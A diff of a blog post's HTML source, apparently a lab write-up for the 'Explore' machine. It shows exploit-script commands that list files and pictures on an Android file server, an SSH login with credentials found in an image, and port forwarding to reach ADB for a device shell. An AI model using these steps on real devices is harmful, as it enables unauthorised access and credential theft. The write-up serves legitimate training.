-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;init.environ.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;1.04 KB (1,064 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;init.android_x86_64.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;3.36 KB (3,439 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;init&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;2.29 MB (2,401,264 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;fstab.android_x86_64&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;753.00 Bytes (753 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;default.prop&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;1.09 KB (1,118 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;charger&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;12/31/69 07:00:00 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;0.00 Bytes (0 Bytes)&#34;</span>, <span class="o">}</span>, 
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;bugreports&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;12/31/69 07:00:00 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;0.00 Bytes (0 Bytes)&#34;</span>, <span class="o">}</span>,
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python poc.py --cmd listFiles --host 10.10.10.247 <span class="p">|</span> grep file
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;vndservice_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;65.00 Bytes (65 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;vendor_service_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;0.00 Bytes (0 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;vendor_seapp_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;0.00 Bytes (0 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;vendor_property_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;392.00 Bytes (392 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;vendor_hwservice_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;0.00 Bytes (0 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;vendor_file_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;6.92 KB (7,081 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;ueventd.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;5.00 KB (5,122 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;ueventd.android_x86_64.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;464.00 Bytes (464 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;sepolicy&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;357.18 KB (365,756 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;plat_service_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;13.73 KB (14,057 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;plat_seapp_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;1.28 KB (1,315 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;plat_property_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;6.53 KB (6,687 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;plat_hwservice_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;7.04 KB (7,212 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;plat_file_contexts&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;23.30 KB (23,863 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;init.zygote64_32.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;875.00 Bytes (875 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;init.zygote32.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;511.00 Bytes (511 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;init.usb.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;5.51 KB (5,646 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;init.usb.configfs.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;7.51 KB (7,690 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;init.superuser.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;582.00 Bytes (582 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;init.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;29.00 KB (29,697 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;init.environ.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;1.04 KB (1,064 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;init.android_x86_64.rc&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;3.36 KB (3,439 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;init&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;2.29 MB (2,401,264 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;fstab.android_x86_64&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;753.00 Bytes (753 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;default.prop&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;6/26/21 03:07:45 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;1.09 KB (1,118 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;charger&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;12/31/69 07:00:00 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;0.00 Bytes (0 Bytes)&#34;</span>, <span class="o">}</span>, 
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;bugreports&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;12/31/69 07:00:00 PM&#34;</span>, <span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;0.00 Bytes (0 Bytes)&#34;</span>, <span class="o">}</span>,
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>The <code>grep file</code> is to exclude folders and list only files, since the output also listed folders (<strong>&ldquo;type&rdquo;:&ldquo;folder&rdquo;</strong>). The reason i wanted to exclude the folders is that when trying to access them, we get an error page saying that directory listing is forbidden:</p>
 <p><img src="https://netuserdoomdesire.github.io/Explore/2.png" alt="Pasted image 20210627115906.png"></p>
 <p>We won&rsquo;t be able to list all the files in a directory, so what we want is to look at every file seperately. We can see on the output that the script managed to find a lot of files, however reading them did not give any meaningful information, so the next step was to list pictures:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -514,15 +514,15 @@ The first command to try was listFiles:</p>
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">python poc.py --cmd listPics --host 10.10.10.247                                                                                                                                                                        
-<span class="o">[</span>*<span class="o">]</span> Executing command: listPics on 10.10.10.247
-<span class="o">[</span>*<span class="o">]</span> Server responded with: <span class="m">200</span>
-
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;concept.jpg&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;4/21/21 02:38:08 AM&#34;</span>, <span class="s2">&#34;location&#34;</span>:<span class="s2">&#34;/storage/emulated/0/DCIM/concept.jpg&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;135.33 KB (138,573 Bytes)&#34;</span>, <span class="o">}</span>,
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;anc.png&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;4/21/21 02:37:50 AM&#34;</span>, <span class="s2">&#34;location&#34;</span>:<span class="s2">&#34;/storage/emulated/0/DCIM/anc.png&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;6.24 KB (6,392 Bytes)&#34;</span>, <span class="o">}</span>,
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;creds.jpg&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;4/21/21 02:38:18 AM&#34;</span>, <span class="s2">&#34;location&#34;</span>:<span class="s2">&#34;/storage/emulated/0/DCIM/creds.jpg&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;1.14 MB (1,200,401 Bytes)&#34;</span>, <span class="o">}</span>,
-<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;224_anc.png&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;4/21/21 02:37:21 AM&#34;</span>, <span class="s2">&#34;location&#34;</span>:<span class="s2">&#34;/storage/emulated/0/DCIM/224_anc.png&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;124.88 KB (127,876 Bytes)&#34;</span><span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python poc.py --cmd listPics --host 10.10.10.247                                                                                                                                                                        
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing command: listPics on 10.10.10.247
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Server responded with: <span class="m">200</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;concept.jpg&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;4/21/21 02:38:08 AM&#34;</span>, <span class="s2">&#34;location&#34;</span>:<span class="s2">&#34;/storage/emulated/0/DCIM/concept.jpg&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;135.33 KB (138,573 Bytes)&#34;</span>, <span class="o">}</span>,
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;anc.png&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;4/21/21 02:37:50 AM&#34;</span>, <span class="s2">&#34;location&#34;</span>:<span class="s2">&#34;/storage/emulated/0/DCIM/anc.png&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;6.24 KB (6,392 Bytes)&#34;</span>, <span class="o">}</span>,
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;creds.jpg&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;4/21/21 02:38:18 AM&#34;</span>, <span class="s2">&#34;location&#34;</span>:<span class="s2">&#34;/storage/emulated/0/DCIM/creds.jpg&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;1.14 MB (1,200,401 Bytes)&#34;</span>, <span class="o">}</span>,
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;224_anc.png&#34;</span>, <span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;4/21/21 02:37:21 AM&#34;</span>, <span class="s2">&#34;location&#34;</span>:<span class="s2">&#34;/storage/emulated/0/DCIM/224_anc.png&#34;</span>, <span class="s2">&#34;size&#34;</span>:<span class="s2">&#34;124.88 KB (127,876 Bytes)&#34;</span><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>We immediately see an image named <strong>creds.jpg</strong> located at <strong>/storage/emulated/0/DCIM/creds.jpg</strong>. Hitting that path on our browser:</p>
 <p><img src="https://netuserdoomdesire.github.io/Explore/3.png" alt="Pasted image 20210627093357.png"></p>
@@ -531,7 +531,7 @@ The first command to try was listFiles:</p>
 <p>Since we now have valid credentials, using them to login via ssh is the next logical step:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -539,35 +539,35 @@ The first command to try was listFiles:</p>
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">ssh kristi@10.10.10.247 -p <span class="m">2222</span>                                                                                                                                                                                                     <span class="m">255</span> ⨯
-Password authentication
-Password: 
-:/ $ whoami
-u0_a76
-:/ $
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh kristi@10.10.10.247 -p <span class="m">2222</span>                                                                                                                                                                                                     <span class="m">255</span> ⨯
+</span></span><span class="line"><span class="cl">Password authentication
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl">:/ $ whoami
+</span></span><span class="line"><span class="cl">u0_a76
+</span></span><span class="line"><span class="cl">:/ $
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>and we get a shell on the device.</p>
 <h1 id="escalating-privileges-to-root"><a href="#escalating-privileges-to-root" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Escalating Privileges to root</h1>
 <p>After getting a shell on the device, we see that we have limited rights to do pretty much anything. Searching for config files, password files, pictures or any other useful file brought no results. At this point we remember that the nmap scan showed us that the device was listening on port 5555, something that we found out to be a vulnerability that could lead an attacker obtaining root access to the device. At that point we could not do anything about it since it was a filtered port, but now we are inside the device. At first we want to see if the device is indeed listening on this port:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">netstat -an <span class="p">|</span> grep LISTEN <span class="p">|</span> grep <span class="m">5555</span>                                     
-tcp6       <span class="m">0</span>      <span class="m">0</span> :::5555                 :::*                    LISTEN
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">netstat -an <span class="p">|</span> grep LISTEN <span class="p">|</span> grep <span class="m">5555</span>                                     
+</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::5555                 :::*                    LISTEN
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>We confirm that the device is listening on port 5555 which means we can again try to connect to it with adb. The problem here though, is that <strong>android-tools-adb</strong> is not installed on the device. So in order to interact with this port we need to do it from our machine, which has the tools we need installed. Did we not try that before though? The answer is no, because now we have valid ssh credentials and access on the device, which means we can now use port forwarding, in order to connect to port 5555, bypassing any firewall rule that was previously preventing us to do so. To port foward we use:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">ssh -L 6666:localhost:5555 kristi@10.10.10.247 -p <span class="m">2222</span> -fN
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -L 6666:localhost:5555 kristi@10.10.10.247 -p <span class="m">2222</span> -fN
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>Flags explained:</p>
 <ul>
@@ -579,72 +579,72 @@ tcp6       <span class="m">0</span>      <span class="m">0</span> :::5555       
 <p>What we have to do now, is repeat the steps we made at the start with <strong>adb</strong>, however we will now connect on port 6666 on our machine! What is going to happen, is that this connection will be forwarded on port 5555 of the target machine, letting us right in. We start by connecting to port 6666 with <strong>adb</strong>:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">adb connect localhost:6666
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">adb connect localhost:6666
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><img src="https://netuserdoomdesire.github.io/Explore/5.png" alt="Pasted image 20210627132719.png"></p>
 <p>The message states that we are connected, so the next step would be to list our connections to confirm it:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">adb devices -l
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">adb devices -l
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><img src="https://netuserdoomdesire.github.io/Explore/6.png" alt="Pasted image 20210627132916.png"></p>
 <p>We see that indeed we are connected to localhost:6666 and we get some info about the device we are connected to. We are now able to execute the last step, which is launching a shell on that device. To do this we use:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">adb -s localhost:6666 shell
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">adb -s localhost:6666 shell
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p><img src="https://netuserdoomdesire.github.io/Explore/7.png" alt="Pasted image 20210627132951.png"></p>
 <p>We now have a shell on the device. While the <code>whoami</code> command shows us that we are not root, the <strong>shell</strong> user of <strong>adb</strong> is meant for developers and has more privileges than other users, including the ability to change to the superuser (root). There is a great article to read about the <strong>shell</strong> user permissions listed on the <strong>Resources</strong> section at the end of this post:</p>
 <div class="highlight"><div class="chroma">
